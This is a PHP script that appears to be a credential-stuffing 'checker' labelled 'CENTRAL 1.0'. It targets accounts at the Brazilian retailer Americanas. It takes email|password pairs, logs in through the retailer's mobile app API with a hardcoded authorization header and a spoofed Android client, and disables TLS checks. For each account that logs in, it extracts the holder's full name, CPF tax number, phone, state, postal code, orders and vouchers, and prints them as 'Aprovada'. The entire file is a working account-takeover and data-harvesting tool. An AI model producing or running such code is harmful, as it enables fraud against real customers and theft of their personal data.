<?php
error_reporting(0);
set_time_limit(0);

$get = $_GET['lista'];
$split = explode("|",$get);
$email = $split[0];
$pwd = $split[1];


function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.americanas.com.br/api/v1/customer-token?c_salesSolution=APP&c_prime=false&c_b2wSid=jy7ekwsq');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'X-Action: Origin: Login Dialog',
'Authorization: Basic YXBwYW5kcm9pZGFjb206R0ZqYjIwNg==',
'User-Agent: acom-android-2.90.0-210001293',
'Content-Type: application/vnd.login.b2w+json',
'Host: sacola.americanas.com.br',
'Cookie: b2wDevice=eyJvcyI6Im5pbCIsIm9zVmVyc2lvbiI6Im5pbCIsInZlbmRvciI6Im5pbCIsInR5cGUiOiJtb2JpbGUiLCJta3ROYW1lIjoibmlsIiwibW9kZWwiOiJuaWwiLCJtb2JpbGVPcHRPdXQiOiJmYWxzZSJ9; b2wDeviceType=mobile',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$pwd.'","login":"'.$email.'"}');
$data = curl_exec($ch);


$token = getStr($data, 'token":"', '"');
$id = getStr($data, 'id":"', '"');

curl_setopt($ch, CURLOPT_URL, 'https://sacola.americanas.com.br/api/v6/customer/'.$id);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'X-Action: Origin: Login',
'access-token: '.$token,
'Authorization: Basic YXBwYW5kcm9pZGFjb206R0ZqYjIwNg==',
'User-Agent: acom-android-3.0.0-210001315',
'Host: sacola.americanas.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data1 = curl_exec($ch);


curl_setopt($ch, CURLOPT_URL, 'https://my-account-bff-americanas.b2w.io/voucher-info?customerId='.$id.'&token='.$token.'&offset=1&limit=5');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'accept: application/json, text/plain, */*',
'cache-control: no-cache',
'Host: my-account-bff-americanas.b2w.io',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.11.0'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data2 = curl_exec($ch);

if(strpos($data2, 'status":"disponivel"')){
	$vale = 'Sim';
}
else{
	$vale = 'Não';
}


curl_setopt($ch, CURLOPT_URL, 'https://sacola.americanas.com.br/api/v6/customer/'.$id.'/address');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'X-Action: Origin: Login',
'access-token:' .$token,
'Authorization: Basic YXBwYW5kcm9pZGFjb206R0ZqYjIwNg==',
'User-Agent: acom-android-3.0.0-210001315',
'Host: sacola.americanas.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data3 = curl_exec($ch);



curl_setopt($ch, CURLOPT_URL, 'https://my-account-bff-americanas.b2w.io/order-info?customerId='.$id.'&token='.$token.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'accept: application/json, text/plain, */*',
'cache-control: no-cache',
'Host: my-account-bff-americanas.b2w.io',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.11.0'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data4 = curl_exec($ch);



if(strpos($data4, 'ORDER_INCLUDED')){
	$pedi = 'Sim';
}
else{
	$pedi = 'Não';
}


$nome = getStr($data1, 'fullName":"', '"');
$cria = getStr($data1, 'creationDate":"', '"');
$ddd = getStr($data1, 'ddd":"', '"');
$tele = getStr($data1, 'number":"', '"');
$cpf = getStr($data1, 'cpf":"', '"');
$estado = getStr($data3, 'state":"', '"');
$zip = getStr($data3, 'zipCode":"', '"');

if(strpos($data, 'token')){
	echo '<p style="color:White;">✔️Aprovada '.$email.'|'.$pwd.' | Nome: '.$nome.' | CPF: '.$cpf.' | Telefone: '.$ddd.' '.$tele.' | Estado: '.$estado.' | CEP: '.$zip.' | Pedidos: '.$pedi.' | Vales: '.$vale.' | Data de Criação: '.$cria. ' | @CENTRAL 1.0</p>';
}
else{
	echo 'Reprovada '.$email.'|'.$pwd. '| CENTRAL 1.0';
}


?>